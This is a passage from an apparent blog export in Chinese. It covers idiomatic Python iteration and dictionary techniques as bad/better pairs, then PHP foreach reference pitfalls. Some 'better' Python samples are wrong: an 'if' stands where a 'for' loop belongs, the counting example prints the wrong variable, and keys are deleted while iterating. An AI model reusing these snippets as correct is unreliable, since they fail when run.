<li><p>python3:(用zip返回迭代)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">names = [<span class="string">'raymond'</span>, <span class="string">'rachel'</span>, <span class="string">'matthew'</span>]</span><br><span class="line">colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>, <span class="string">'yellow'</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">n = min(len(names),len(colors))</span><br><span class="line"><span class="keyword">for</span>  i <span class="keyword">in</span> range(n):</span><br><span class="line">    print(names[i],<span class="string">'---&gt;'</span>,colors[i])</span><br><span class="line"><span class="comment">#batter</span></span><br><span class="line"><span class="keyword">for</span> name, color <span class="keyword">in</span> zip(names,colors):</span><br><span class="line">    print(name,<span class="string">'---&gt;'</span>,color)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="遍历排序的序列"><a href="#遍历排序的序列" class="headerlink" title="遍历排序的序列"></a>遍历排序的序列</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">colors = [<span class="string">'red'</span>,<span class="string">'green'</span>,<span class="string">'blue'</span>,<span class="string">'yellow'</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">#Forward sorted order</span></span><br><span class="line"><span class="keyword">for</span> color <span class="keyword">in</span> sorted(colors):</span><br><span class="line">    print(color)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#Backwards sorted order</span></span><br><span class="line"><span class="keyword">for</span> color <span class="keyword">in</span> sorted(colors,reverse=<span class="keyword">True</span>):</span><br><span class="line">    print(color)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="自定义遍历序列"><a href="#自定义遍历序列" class="headerlink" title="自定义遍历序列"></a>自定义遍历序列</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>, <span class="string">'yellow'</span>]</span><br><span class="line"> </span><br><span class="line">print(sorted(colors,key=len))</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="遍历文件遇到指定字符退出"><a href="#遍历文件遇到指定字符退出" class="headerlink" title="遍历文件遇到指定字符退出"></a>遍历文件遇到指定字符退出</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bad</span></span><br><span class="line">blocks = []</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    block = f.read(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">if</span> block == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    blocks.append(block)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#better</span></span><br><span class="line">blocks = []</span><br><span class="line"><span class="keyword">if</span> block <span class="keyword">in</span> iter(partial(read,<span class="number">32</span>),<span class="string">''</span>):</span><br><span class="line">    blocks.append(block)</span><br><span class="line"><span class="comment">#iter是一个内置函数用来生产迭代器，partial的不断的读入文件中32字节，注意iter引入第二个参数，表示当读入的内容是''的时候，会触发生成器stop</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="函数遍历多出口问题"><a href="#函数遍历多出口问题" class="headerlink" title="函数遍历多出口问题"></a>函数遍历多出口问题</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(seq, target)</span>:</span></span><br><span class="line">    found = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">for</span> i, value <span class="keyword">in</span> enumerate(seq):</span><br><span class="line">        <span class="keyword">if</span> value == target:</span><br><span class="line">            found = <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"> </span><br><span class="line"><span class="comment">#better(for else结构)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(seq, target)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i, value <span class="keyword">in</span> enumerate(seq):</span><br><span class="line">        <span class="keyword">if</span> value == target:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="遍历字典"><a href="#遍历字典" class="headerlink" title="遍历字典"></a>遍历字典</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">'matthew'</span>: <span class="string">'blue'</span>, <span class="string">'rachel'</span>: <span class="string">'green'</span>, <span class="string">'raymond'</span>: <span class="string">'red'</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> d:</span><br><span class="line">    print(k)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> d.keys():</span><br><span class="line">    <span class="keyword">if</span> k.startswith(<span class="string">'a'</span>):</span><br><span class="line">        <span class="keyword">del</span> d[k]</span><br></pre></td></tr></table></figure>
</li>
<li><p>遍历键和值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">'matthew'</span>: <span class="string">'blue'</span>, <span class="string">'rachel'</span>: <span class="string">'green'</span>, <span class="string">'raymond'</span>: <span class="string">'red'</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> d:</span><br><span class="line">    print(k, <span class="string">'--&gt;'</span>, d[k])</span><br><span class="line"> </span><br><span class="line"><span class="comment">#batter</span></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> d.items():</span><br><span class="line">    print(k,<span class="string">'---&gt;'</span>,v)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="构造字典"><a href="#构造字典" class="headerlink" title="构造字典"></a>构造字典</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">names = [<span class="string">'raymond'</span>, <span class="string">'rachel'</span>, <span class="string">'matthew'</span>]</span><br><span class="line">colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>]</span><br><span class="line"> </span><br><span class="line">d = dict(zip(names, colors))</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="字典的统计"><a href="#字典的统计" class="headerlink" title="字典的统计"></a>字典的统计</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'red'</span>, <span class="string">'blue'</span>, <span class="string">'green'</span>, <span class="string">'red'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> color <span class="keyword">in</span> colors:</span><br><span class="line">    <span class="keyword">if</span> color <span class="keyword">not</span> <span class="keyword">in</span> d:</span><br><span class="line">        d[color] = <span class="number">0</span></span><br><span class="line">    d[color] += <span class="number">1</span></span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#batter</span></span><br><span class="line">s = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> color <span class="keyword">in</span> colors:</span><br><span class="line">    s[color] = s.get(color,<span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="对序列的值根据元素长度进行分组"><a href="#对序列的值根据元素长度进行分组" class="headerlink" title="对序列的值根据元素长度进行分组"></a>对序列的值根据元素长度进行分组</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">names = [<span class="string">'raymond'</span>, <span class="string">'rachel'</span>, <span class="string">'matthew'</span>, <span class="string">'roger'</span>,</span><br><span class="line">         <span class="string">'betty'</span>, <span class="string">'melissa'</span>, <span class="string">'judith'</span>, <span class="string">'charlie'</span>]</span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">    key = len(name)</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> d:</span><br><span class="line">        d[key] = []</span><br><span class="line">    d[key].append(name)</span><br><span class="line"></span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">    key = len(name)</span><br><span class="line">    d.setdefault(key, []).append(name)</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#better</span></span><br><span class="line">s = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">    key = len(name)</span><br><span class="line">    s.setdefault(key, []).append(name)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="字典遍历倒序"><a href="#字典遍历倒序" class="headerlink" title="字典遍历倒序"></a>字典遍历倒序</h3><ul>
<li><p>python3:(使用popitem)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">'matthew'</span>: <span class="string">'blue'</span>, <span class="string">'rachel'</span>: <span class="string">'green'</span>, <span class="string">'raymond'</span>: <span class="string">'red'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> d:</span><br><span class="line">    key, value = d.popitem()</span><br><span class="line">    <span class="keyword">print</span> (key, <span class="string">'--&gt;'</span>, value)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="字典链接"><a href="#字典链接" class="headerlink" title="字典链接"></a>字典链接</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"></span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">defaults = &#123;<span class="string">'color'</span>: <span class="string">'red'</span>, <span class="string">'user'</span>: <span class="string">'guest'</span>&#125;</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">'-u'</span>, <span class="string">'--user'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--color'</span>)</span><br><span class="line">namespace = parser.parse_args([])</span><br><span class="line">command_line_args = &#123;k:v <span class="keyword">for</span> k, v <span class="keyword">in</span> vars(namespace).items() <span class="keyword">if</span> v&#125;</span><br><span class="line"></span><br><span class="line">d = defaults.copy()</span><br><span class="line">d.update(os.environ)</span><br><span class="line">d.update(command_line_args)</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#better</span></span><br><span class="line">d = collections.ChainMap(command_line_args, os.environ, defaults)</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#关于Python中ChainMap的使用：http://blog.topspeedsnail.com/archives/9726</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="使用关键字提高代码清晰度"><a href="#使用关键字提高代码清晰度" class="headerlink" title="使用关键字提高代码清晰度"></a>使用关键字提高代码清晰度</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bad</span></span><br><span class="line">twitter_search(<span class="string">'@obama'</span>, <span class="keyword">False</span>, <span class="number">20</span>, <span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Better</span></span><br><span class="line">twitter_search(<span class="string">'@obama'</span>, retweets=<span class="keyword">False</span>, numtweets=<span class="number">20</span>, popular=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="展开序列"><a href="#展开序列" class="headerlink" title="展开序列"></a>展开序列</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = [<span class="string">'Leo'</span>,<span class="string">'Xin'</span>,<span class="string">'30'</span>,<span class="string">'coder'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">fname = p[<span class="number">0</span>]</span><br><span class="line">lname = p[<span class="number">1</span>]</span><br><span class="line">age = p[<span class="number">2</span>]</span><br><span class="line">email = p[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#better</span></span><br><span class="line">fname,lname,age,email = p</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="交换变量"><a href="#交换变量" class="headerlink" title="交换变量"></a>交换变量</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span><span class="params">(n)</span>:</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    y = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        print(x)</span><br><span class="line">        t = y</span><br><span class="line">        y = x + y</span><br><span class="line">        x = t</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span><span class="params">(n)</span>:</span></span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">print</span> (x)</span><br><span class="line">        x, y = y, x + y</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="更新序列"><a href="#更新序列" class="headerlink" title="更新序列"></a>更新序列</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line">names = [<span class="string">'raymond'</span>, <span class="string">'rachel'</span>, <span class="string">'matthew'</span>, <span class="string">'roger'</span>,</span><br><span class="line">         <span class="string">'betty'</span>, <span class="string">'melissa'</span>, <span class="string">'judith'</span>, <span class="string">'charlie'</span>]</span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="keyword">del</span> names[<span class="number">0</span>]</span><br><span class="line">names.pop(<span class="number">0</span>)</span><br><span class="line">names.insert(<span class="number">0</span>, <span class="string">'mark'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Better</span></span><br><span class="line">names = collections.deque([<span class="string">'raymond'</span>, <span class="string">'rachel'</span>, <span class="string">'matthew'</span>, <span class="string">'roger'</span>,</span><br><span class="line">               <span class="string">'betty'</span>, <span class="string">'melissa'</span>, <span class="string">'judith'</span>, <span class="string">'charlie'</span>])</span><br><span class="line"><span class="keyword">del</span> names[<span class="number">0</span>]</span><br><span class="line">names.popleft()</span><br><span class="line">names.appendleft(<span class="string">'mark'</span>)</span><br><span class="line">print(names)</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用collections模块里面的双向队列，会更简洁</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="使用线程锁"><a href="#使用线程锁" class="headerlink" title="使用线程锁"></a>使用线程锁</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">lock.acquire()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'Critical section 1'</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'Critical section 2'</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    lock.release()</span><br><span class="line"></span><br><span class="line"><span class="comment">#Better</span></span><br><span class="line"><span class="keyword">with</span> lock:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'Critical section 1'</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'Critical section 2'</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="修改for循环语句"><a href="#修改for循环语句" class="headerlink" title="修改for循环语句"></a>修改for循环语句</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result = []</span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    s = i ** <span class="number">2</span></span><br><span class="line">    result.append(s)</span><br><span class="line"><span class="keyword">print</span> (sum(result))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Better</span></span><br><span class="line"><span class="keyword">print</span> (sum(i**<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)))</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>foreach的一些小坑</title>
    <url>/2018/09/29/foreach%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%9D%91/</url>
    <content><![CDATA[<h3 id="PHP-foreach的一些小坑"><a href="#PHP-foreach的一些小坑" class="headerlink" title="PHP-foreach的一些小坑"></a>PHP-foreach的一些小坑</h3><blockquote>
<p>再PHP中，foreach是对数组遍历的一个方法，遍历也只用于数组，在编程的时候有一些小坑，记录如下。</p>
</blockquote>
<h4 id="foreach的两种语法结构"><a href="#foreach的两种语法结构" class="headerlink" title="foreach的两种语法结构"></a>foreach的两种语法结构</h4><ol>
<li><p>只遍历引用值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $value)</span><br><span class="line">    　　statement</span><br><span class="line">    </span><br><span class="line"><span class="comment">//示例：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $value;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//显示结果：</span></span><br><span class="line"><span class="number">1234</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>遍历引用键和值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">  　　  statement</span><br><span class="line">  　　  </span><br><span class="line"><span class="comment">//示例：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"[$key] =&gt; $value\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"[$key] =&gt; $value"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line">[<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">[<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">[<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">[<span class="number">3</span>] =&gt; <span class="number">4</span></span><br><span class="line"></span><br><span class="line">[<span class="number">3</span>] =&gt; <span class="number">4</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="在foreach中是否使用-amp-的区别："><a href="#在foreach中是否使用-amp-的区别：" class="headerlink" title="在foreach中是否使用&amp;的区别："></a>在foreach中是否使用&amp;的区别：</h4><ol>
<li><p>不使用&amp;，foreach的作用域只在当前循环中，不会改变外部数组的值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">	$value = $value * <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">print_r($arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span> <span class="number">6</span> <span class="number">8</span> </span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">4</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用&amp;会使得作用域扩大到对应的数组，改变数组的值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">	$value = $value * <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">print_r($arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span> <span class="number">6</span> <span class="number">8</span> </span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">4</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">6</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">8</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="在foreach中是否使用-amp-的坑点："><a href="#在foreach中是否使用-amp-的坑点：" class="headerlink" title="在foreach中是否使用&amp;的坑点："></a>在foreach中是否使用&amp;的坑点：</h4><ol>
<li><p>这里和上面的作用域联系起来，没使用以后不会影响数组本身，所以两次foreach的结果互不影响：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">	<span class="comment">// $value = $value * 2;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $value;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $value;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> </span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> </span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用以后改变了作用域，这里&amp;指向第一次foreach的最后一个地址，在PHP中它不会自动释放该地址：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">	<span class="comment">// $value = $value * 2;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $value;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $value;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> </span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">3</span> </span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查看它每次具体的变化：(这里可以验证每次改变的是&amp;指向的最后一个地址)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$value) &#123;&#125;</span><br><span class="line">;</span><br><span class="line">print_r($arr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&#123;$key&#125; =&gt; &#123;$value&#125; "</span>;</span><br><span class="line">	print_r($arr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">4</span></span><br><span class="line">)</span><br><span class="line"><span class="number">0</span> =&gt; <span class="number">1</span> <span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">1</span></span><br><span class="line">)</span><br><span class="line"><span class="number">1</span> =&gt; <span class="number">2</span> <span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">2</span></span><br><span class="line">)</span><br><span class="line"><span class="number">2</span> =&gt; <span class="number">3</span> <span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">3</span></span><br><span class="line">)</span><br><span class="line"><span class="number">3</span> =&gt; <span class="number">3</span> <span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">3</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
<li><p>解决方法：在每次foreach后unset解除&amp;的指定关系，或者在每次遍历中使用不同的变量名：</p>
